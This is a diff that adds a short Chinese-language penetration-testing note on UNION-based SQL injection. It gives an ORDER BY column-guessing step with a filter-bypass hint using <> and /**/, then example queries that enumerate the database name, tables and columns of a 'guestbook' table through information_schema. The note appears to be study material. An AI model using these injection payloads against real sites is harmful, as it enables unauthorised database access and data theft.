@@ -1,0 +1,7 @@
+0.order by：主要是用来猜测数据库的数量【可尝试用<> /**/绕过后端】
+1.爆数据库名(实际渗透操作中主要是看union开始的部分)
+select name,comment_id,Sex,comment_id from guestbook where comment_id=1 union select 1,database(),2,3;
+2.爆表名(实际操作渗透中主要是看union开始的部分)
+select name,comment_id,Sex,comment_id from guestbook where comment_id=1 union select 1,table_name,3,4 from information_schema.tables where table_schema='test';
+3.爆字段名(实际操作渗透中主要是看union开始的部分)
+select name,comment_id,Sex,comment_id from guestbook where comment_id=1 union select 1,column_name,3,4 from information_schema.columns where table_name='guestbook';
